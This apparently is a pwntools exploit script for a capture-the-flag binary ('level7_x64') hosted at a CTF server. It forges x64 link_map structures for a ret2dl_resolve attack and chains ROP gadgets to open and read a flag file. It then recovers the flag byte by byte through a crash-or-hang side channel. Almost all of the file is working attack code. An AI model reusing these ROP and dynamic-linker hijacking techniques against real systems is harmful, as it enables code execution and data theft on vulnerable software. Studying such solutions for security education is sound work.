#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
#context.log_level="debug"
pwn_file="./level7_x64"

elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
context.arch = elf.arch

def get_conn():
    if len(sys.argv)==1:
        r=process("/dbg/glibc/lib/ld-linux-x86-64.so.2 --library-path /lib/x86_64-linux-gnu/ ./level7_x64".split(" "))
        pid=r.pid
    else:
        r=remote("pwn.sixstars.team",23007)
        pid=0
    return r, pid

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    '''
    # value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
    WARNING: assert *(known_offset_addr-8) & 0x0000ff0000000000 != 0 
    WARNING: fake_linkmap is 0x100 bytes length,be careful
    WARNING: two_offset = target - *(known_offset_addr)

    _dl_runtime_resolve(linkmap,reloc_arg)
    reloc_arg=0
    linkmap:
    0x00: START
    0x00: l_addr = two_offset
    0x08: fake_DT_JMPREL : 0
    0x10: fake_DT_JMPREL : p_fake_JMPREL
    0x18: fake_JMPREL = [p_r_offset,r_info,append],p_r_offset
    0x20: r_info
    0x28: append
    0x30: r_offset
    0x38: fake_DT_SYMTAB: 0
    0x40: fake_DT_SYMTAB: known_offset_addr-8
    0x48: /bin/sh(for system)
    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
    0xf8: p_DT_JMPREL = fake_DT_JMPREL
    0x100: END
    '''
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
    print(hex(plt0))
    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)
    linkmap+=p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0) # p_fake_JMPREL
    linkmap+=p64(0) 
    linkmap+=p64(0)+p64(known_offset_addr-8) # 0x38 
    linkmap+='./flag\x00' # for system offset 0x48 size:0x20
    linkmap = linkmap.ljust(0x68,'A')
    linkmap+=p64(linkmap_addr)  # 随便给一个指针 
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'A')
    linkmap+=p64(linkmap_addr+8)

    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)

# gadgets on elf
pop_rdi_ret     = 0x00000000004009a3
pop_rsi_r15_ret = 0x00000000004009a1
gets =  0x400700
libc_start_main = 0x601040
bss = 0x601000
flag_addr = bss + 0x200 -5 # 读入flag地址, 保证循环时不出现意外'\n'
read_addr = bss + 0x300
# p_DT_SYMTAB = bss+0x700
# p_DT_JMPREL = p_DT_SYMTAB + 0x10
# p_fake_JMPREL = p_DT_JMPREL +0x10

# linkmap_addr = bss + 0x800

# libc上需要解析的libc gadgets:
#read
#open
pop_rdx_ret =     0x0000000000001b92
pop_rcx_rbx_ret = 0x00000000000ea69a
pop_rax_ret =     0x0000000000033544
fill_rax =        0x0000000000074f73 # mov rax, qword ptr [rax + 0x4c] ; ret
cmp_seg  =        0x0000000000035302 # sub al, byte ptr [rcx + rdi] ; test eax, eax ; jne 0x35319 ; ret

open_offset = libc.sym['open'] - libc.sym['__libc_start_main']
read_offset = libc.sym['read'] - libc.sym['__libc_start_main']
pop_rdx_offset = pop_rdx_ret -  libc.sym['__libc_start_main']
pop_rcx_rbx_offset = pop_rcx_rbx_ret - libc.sym['__libc_start_main']
pop_rax_offset = pop_rax_ret - libc.sym['__libc_start_main']
fill_rax_offset = fill_rax - libc.sym['__libc_start_main']
cmp_seg_offset = cmp_seg - libc.sym['__libc_start_main']

# fake_DT_SYMTAB = p64(0)+p64(libc_start_main-8)
# fake_DT_JMPREL = p64(0)
# fake_DT_JMPREL+= p_fake_JMPREL
# fake_JMPREL   += p64((linkmap_addr+0x30-open_offset)&(2**64-1))+p64(0x7)+p64(0)
# fake_JMPREL   += p64((linkmap_addr+0x30-read_offset)&(2**64-1))+p64(0x7)+p64(0)
# fake_JMPREL   += p64((linkmap_addr+0x30-pop_rdx_offset)&(2**64-1))+p64(0x7)+p64(0)
# fake_JMPREL   += p64((linkmap_addr+0x30-pop_rcx_rbx_offset)&(2**64-1))+p64(0x7)+p64(0)
# fake_JMPREL   += p64((linkmap_addr+0x30-pop_rax_offset)&(2**64-1))+p64(0x7)+p64(0)
# fake_JMPREL   += p64((linkmap_addr+0x30-fill_rax_offset)&(2**64-1))+p64(0x7)+p64(0)
# fake_JMPREL   += p64((linkmap_addr+0x30-cmp_seg_offset)&(2**64-1))+p64(0x7)+p64(0)

linkmap_addr = bss + 0x600
linkmap_addr_open = bss + 0x600
linkmap_addr_read = bss + 0x700
linkmap_addr_pop_rdx= bss + 0x800
linkmap_addr_pop_rcx_rbx= bss + 0x900
linkmap_addr_pop_rax= bss + 0xa00
linkmap_addr_fill_rax= bss + 0xb00
linkmap_addr_cmp_seg= bss + 0xc00
flag_bss_addr = linkmap_addr + 0x48

(linkmap1,open_resolve_call) =  ret2dl_resolve_linkmap_x64(elf, libc_start_main, open_offset, linkmap_addr_open)
(linkmap2,read_resolve_call) =  ret2dl_resolve_linkmap_x64(elf, libc_start_main, read_offset, linkmap_addr_read)
(linkmap3,pop_rdx_resolve_call) =  ret2dl_resolve_linkmap_x64(elf, libc_start_main, pop_rdx_offset, linkmap_addr_pop_rdx)
(linkmap4,pop_rcx_rbx_resolve_call) =  ret2dl_resolve_linkmap_x64(elf, libc_start_main, pop_rcx_rbx_offset, linkmap_addr_pop_rcx_rbx)
(linkmap5,pop_rax_resolve_call) =  ret2dl_resolve_linkmap_x64(elf, libc_start_main, pop_rax_offset, linkmap_addr_pop_rax)
(linkmap6,fill_rax_resolve_call) =  ret2dl_resolve_linkmap_x64(elf, libc_start_main, fill_rax_offset, linkmap_addr_fill_rax)
(linkmap7,cmp_seg_resolve_call) =  ret2dl_resolve_linkmap_x64(elf, libc_start_main, cmp_seg_offset, linkmap_addr_cmp_seg)

FLAG = '|||'
for j in range(40):
    ### 利用gets读取linkmap至bss上
    payload =  'a'*0x28 + flat([pop_rdi_ret, linkmap_addr, gets])
    ### 打开文件
    payload += flat([pop_rdi_ret,  flag_bss_addr, \
                     pop_rsi_r15_ret,  0,  0, \
                     pop_rdx_resolve_call, 4, \
                     open_resolve_call ])
    ### 读取flag至 .bss
    payload += flat([pop_rdi_ret,  3, \
                     pop_rsi_r15_ret, flag_addr,  0, \
                     pop_rdx_resolve_call, j+1, \
                     read_resolve_call ])


    ### gets1byte并比较
    payload += flat([pop_rdi_ret, read_addr,gets,\
                     pop_rdi_ret, read_addr,
                     pop_rcx_rbx_resolve_call,0,0,
                     pop_rax_resolve_call, flag_addr-0x4c+j,
                     fill_rax_resolve_call,
                     cmp_seg_resolve_call,
                     pop_rdi_ret, read_addr, gets])

    ### link_maps
    payload+= '\n'
    payload+= linkmap1+linkmap2+linkmap3+linkmap4+linkmap5+linkmap6+linkmap7
    payload+= '\n'
    
    sss = r"0123456789abcdef*t{}"
    for i in range(len(sss)):
        c = sss[i]
        # 除某次输入的字节外, 都相等
        r, pid = get_conn()
        payload_in=payload + c+'\n'
        # 设置成0x1000否则远程不会断
        payload_in=payload_in.ljust(0x1000,'A')
        # payload+='\nanything'
        # debug()
        r.send(payload_in)
        #r.interactive()
        try:
           # sleep()
           #r.sendline('a')
           r.recv(1, timeout=2)
           r.close()
           # 
           # r.sendline("test connect...")

           #sleep(1)
           #r.wait(0.01)
           #r.sendline("test connect...")
           #r.recv(2, timeout=2)
        except:
           r.close()
           print "not this char: "
           print c
           if i==len(sss)-1:
              FLAG+='AAAA'
        else:
           print "got one, ord is: "
           print c
           FLAG+=c
           print FLAG
           break
        


# for j in range(55):
#     r, pid = get_conn()
#     flag_pos  = flag_addr +j
#     read_addr = read_addr

    
#     for i in range(0x20,128): # 在printable 范围内遍历 
#       try:
#           r.sendline(chr(i)) # 发送一个char
#           sleep(0.1)
#       except:
#           print "this char is:"
#           print chr(i-1)
#           flag += chr(i-1)
#           break
     
#     r.close()

print FLAG

r.interactive()

